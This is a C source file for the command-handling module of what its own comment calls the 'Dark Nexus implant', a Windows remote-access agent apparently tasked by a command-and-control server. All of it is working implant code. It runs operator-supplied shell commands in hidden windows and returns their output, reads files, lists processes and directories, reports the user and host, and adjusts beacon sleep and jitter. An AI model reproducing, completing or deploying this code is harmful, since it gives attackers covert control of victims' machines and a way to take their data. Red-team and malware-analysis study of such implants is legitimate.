#include "cmd_exec.h"
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

/*
 * Command execution handlers for Dark Nexus implant
 * Each handler receives a task and fills the result struct
 */

// Internal: run a process with redirected stdout/stderr, return output
static char* run_process(const char* cmdline, DWORD* output_len) {
    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
    HANDLE hReadPipe = NULL, hWritePipe = NULL;

    if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0))
        return NULL;

    SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdOutput = hWritePipe;
    si.hStdError = hWritePipe;
    si.wShowWindow = SW_HIDE;

    // CreateProcessA needs a mutable command line
    char cmd_buf[8192];
    strncpy(cmd_buf, cmdline, sizeof(cmd_buf) - 1);
    cmd_buf[sizeof(cmd_buf) - 1] = '\0';

    BOOL created = CreateProcessA(
        NULL, cmd_buf, NULL, NULL, TRUE,
        CREATE_NO_WINDOW, NULL, NULL, &si, &pi
    );

    CloseHandle(hWritePipe);

    if (!created) {
        CloseHandle(hReadPipe);
        return NULL;
    }

    // read all output
    DWORD total = 0;
    DWORD capacity = 4096;
    char* output = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, capacity);
    if (!output) {
        CloseHandle(hReadPipe);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return NULL;
    }

    DWORD bytes_read = 0;
    while (ReadFile(hReadPipe, output + total, capacity - total - 1, &bytes_read, NULL) && bytes_read > 0) {
        total += bytes_read;
        if (total >= capacity - 256) {
            capacity *= 2;
            char* new_buf = (char*)HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, output, capacity);
            if (!new_buf) break;
            output = new_buf;
        }
    }
    output[total] = '\0';

    WaitForSingleObject(pi.hProcess, 30000); // 30s timeout
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hReadPipe);

    *output_len = total;
    return output;
}

// Internal: set result to a simple string
static void set_result_string(DN_TASK_RESULT* result, const char* str) {
    DWORD len = (DWORD)strlen(str);
    result->output = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, len + 1);
    if (result->output) {
        memcpy(result->output, str, len);
        result->output_len = len;
    }
    strncpy(result->status, "completed", sizeof(result->status) - 1);
}

static void set_result_error(DN_TASK_RESULT* result, const char* err) {
    DWORD len = (DWORD)strlen(err);
    result->output = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, len + 1);
    if (result->output) {
        memcpy(result->output, err, len);
        result->output_len = len;
    }
    strncpy(result->status, "failed", sizeof(result->status) - 1);
}

// ============================================================
// Command Handlers
// ============================================================

BOOL dn_cmd_shell(DN_TASK* task, DN_TASK_RESULT* result) {
    strncpy(result->task_id, task->id, sizeof(result->task_id) - 1);

    if (!task->args || task->args_len == 0) {
        set_result_error(result, "no command specified");
        return TRUE;
    }

    // wrap in cmd.exe /c
    char cmdline[8192];
    snprintf(cmdline, sizeof(cmdline), "cmd.exe /c %s", task->args);

    DWORD out_len = 0;
    char* output = run_process(cmdline, &out_len);

    if (output) {
        result->output = output;
        result->output_len = out_len;
        strncpy(result->status, "completed", sizeof(result->status) - 1);
    } else {
        set_result_error(result, "shell execution failed");
    }

    return TRUE;
}

BOOL dn_cmd_exec(DN_TASK* task, DN_TASK_RESULT* result) {
    strncpy(result->task_id, task->id, sizeof(result->task_id) - 1);

    if (!task->args || task->args_len == 0) {
        set_result_error(result, "no program specified");
        return TRUE;
    }

    DWORD out_len = 0;
    char* output = run_process(task->args, &out_len);

    if (output) {
        result->output = output;
        result->output_len = out_len;
        strncpy(result->status, "completed", sizeof(result->status) - 1);
    } else {
        set_result_error(result, "exec failed");
    }

    return TRUE;
}

BOOL dn_cmd_pwd(DN_TASK* task, DN_TASK_RESULT* result) {
    strncpy(result->task_id, task->id, sizeof(result->task_id) - 1);

    char cwd[MAX_PATH];
    DWORD len = GetCurrentDirectoryA(MAX_PATH, cwd);
    if (len > 0) {
        set_result_string(result, cwd);
    } else {
        set_result_error(result, "failed to get working directory");
    }

    return TRUE;
}

BOOL dn_cmd_cd(DN_TASK* task, DN_TASK_RESULT* result) {
    strncpy(result->task_id, task->id, sizeof(result->task_id) - 1);

    if (!task->args || task->args_len == 0) {
        set_result_error(result, "no directory specified");
        return TRUE;
    }

    if (SetCurrentDirectoryA(task->args)) {
        char cwd[MAX_PATH];
        GetCurrentDirectoryA(MAX_PATH, cwd);
        set_result_string(result, cwd);
    } else {
        set_result_error(result, "directory not found");
    }

    return TRUE;
}

BOOL dn_cmd_whoami(DN_TASK* task, DN_TASK_RESULT* result) {
    strncpy(result->task_id, task->id, sizeof(result->task_id) - 1);

    char username[256];
    DWORD size = sizeof(username);
    char domain[256];
    DWORD dsize = sizeof(domain);

    if (GetUserNameA(username, &size)) {
        // try to get domain too
        char fullname[512];
        DWORD envsize = GetEnvironmentVariableA("USERDOMAIN", domain, sizeof(domain));
        if (envsize > 0) {
            snprintf(fullname, sizeof(fullname), "%s\\%s", domain, username);
            set_result_string(result, fullname);
        } else {
            set_result_string(result, username);
        }
    } else {
        set_result_error(result, "failed to get username");
    }

    return TRUE;
}

BOOL dn_cmd_hostname(DN_TASK* task, DN_TASK_RESULT* result) {
    strncpy(result->task_id, task->id, sizeof(result->task_id) - 1);

    char hostname[256];
    DWORD size = sizeof(hostname);

    if (GetComputerNameA(hostname, &size)) {
        set_result_string(result, hostname);
    } else {
        set_result_error(result, "failed to get hostname");
    }

    return TRUE;
}

BOOL dn_cmd_ps(DN_TASK* task, DN_TASK_RESULT* result) {
    strncpy(result->task_id, task->id, sizeof(result->task_id) - 1);

    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) {
        set_result_error(result, "failed to enumerate processes");
        return TRUE;
    }

    // build output buffer
    DWORD capacity = 8192;
    char* output = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, capacity);
    if (!output) {
        CloseHandle(snap);
        set_result_error(result, "alloc failed");
        return TRUE;
    }

    int pos = 0;
    pos += snprintf(output + pos, capacity - pos, "%-8s %-8s %s\n", "PID", "PPID", "Name");
    pos += snprintf(output + pos, capacity - pos, "%-8s %-8s %s\n", "---", "----", "----");

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(pe);

    if (Process32First(snap, &pe)) {
        do {
            if (pos >= (int)(capacity - 512)) {
                capacity *= 2;
                char* new_buf = (char*)HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, output, capacity);
                if (!new_buf) break;
                output = new_buf;
            }
            pos += snprintf(output + pos, capacity - pos, "%-8lu %-8lu %s\n",
                           pe.th32ProcessID, pe.th32ParentProcessID, pe.szExeFile);
        } while (Process32Next(snap, &pe));
    }

    CloseHandle(snap);

    result->output = output;
    result->output_len = pos;
    strncpy(result->status, "completed", sizeof(result->status) - 1);

    return TRUE;
}

BOOL dn_cmd_ls(DN_TASK* task, DN_TASK_RESULT* result) {
    strncpy(result->task_id, task->id, sizeof(result->task_id) - 1);

    char search_path[MAX_PATH];
    if (task->args && task->args_len > 0) {
        snprintf(search_path, sizeof(search_path), "%s\\*", task->args);
    } else {
        char cwd[MAX_PATH];
        GetCurrentDirectoryA(MAX_PATH, cwd);
        snprintf(search_path, sizeof(search_path), "%s\\*", cwd);
    }

    WIN32_FIND_DATAA fd;
    HANDLE hFind = FindFirstFileA(search_path, &fd);
    if (hFind == INVALID_HANDLE_VALUE) {
        set_result_error(result, "directory not found");
        return TRUE;
    }

    DWORD capacity = 8192;
    char* output = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, capacity);
    if (!output) {
        FindClose(hFind);
        set_result_error(result, "alloc failed");
        return TRUE;
    }

    int pos = 0;
    pos += snprintf(output + pos, capacity - pos, "%-12s %-20s %s\n", "Size", "Modified", "Name");
    pos += snprintf(output + pos, capacity - pos, "%-12s %-20s %s\n", "----", "--------", "----");

    do {
        if (pos >= (int)(capacity - 512)) {
            capacity *= 2;
            char* new_buf = (char*)HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, output, capacity);
            if (!new_buf) break;
            output = new_buf;
        }

        BOOL is_dir = (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) != 0;
        ULARGE_INTEGER filesize;
        filesize.LowPart = fd.nFileSizeLow;
        filesize.HighPart = fd.nFileSizeHigh;

        SYSTEMTIME st;
        FileTimeToSystemTime(&fd.ftLastWriteTime, &st);

        char time_buf[32];
        snprintf(time_buf, sizeof(time_buf), "%04d-%02d-%02d %02d:%02d",
                 st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute);

        if (is_dir) {
            pos += snprintf(output + pos, capacity - pos, "%-12s %-20s %s/\n",
                           "<DIR>", time_buf, fd.cFileName);
        } else {
            pos += snprintf(output + pos, capacity - pos, "%-12llu %-20s %s\n",
                           filesize.QuadPart, time_buf, fd.cFileName);
        }
    } while (FindNextFileA(hFind, &fd));

    FindClose(hFind);

    result->output = output;
    result->output_len = pos;
    strncpy(result->status, "completed", sizeof(result->status) - 1);

    return TRUE;
}

BOOL dn_cmd_cat(DN_TASK* task, DN_TASK_RESULT* result) {
    strncpy(result->task_id, task->id, sizeof(result->task_id) - 1);

    if (!task->args || task->args_len == 0) {
        set_result_error(result, "no file specified");
        return TRUE;
    }

    HANDLE hFile = CreateFileA(task->args, GENERIC_READ, FILE_SHARE_READ,
                                NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        set_result_error(result, "file not found");
        return TRUE;
    }

    DWORD file_size = GetFileSize(hFile, NULL);
    if (file_size == INVALID_FILE_SIZE || file_size > 10 * 1024 * 1024) {
        CloseHandle(hFile);
        set_result_error(result, "file too large (>10MB)");
        return TRUE;
    }

    char* content = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, file_size + 1);
    if (!content) {
        CloseHandle(hFile);
        set_result_error(result, "alloc failed");
        return TRUE;
    }

    DWORD bytes_read = 0;
    if (ReadFile(hFile, content, file_size, &bytes_read, NULL)) {
        content[bytes_read] = '\0';
        result->output = content;
        result->output_len = bytes_read;
        strncpy(result->status, "completed", sizeof(result->status) - 1);
    } else {
        HeapFree(GetProcessHeap(), 0, content);
        set_result_error(result, "read failed");
    }

    CloseHandle(hFile);
    return TRUE;
}

BOOL dn_cmd_sleep(DN_TASK* task, DN_TASK_RESULT* result) {
    strncpy(result->task_id, task->id, sizeof(result->task_id) - 1);

    if (!task->args || task->args_len == 0) {
        set_result_error(result, "usage: sleep <seconds> [jitter%]");
        return TRUE;
    }

    // parse "seconds" or "seconds jitter"
    int new_sleep = 0, new_jitter = -1;
    sscanf(task->args, "%d %d", &new_sleep, &new_jitter);

    if (new_sleep <= 0) {
        set_result_error(result, "invalid sleep value");
        return TRUE;
    }

    // we return the values, main.c applies them to the global config
    char buf[128];
    if (new_jitter >= 0) {
        snprintf(buf, sizeof(buf), "sleep=%d jitter=%d", new_sleep, new_jitter);
    } else {
        snprintf(buf, sizeof(buf), "sleep=%d", new_sleep);
    }
    set_result_string(result, buf);

    return TRUE;
}
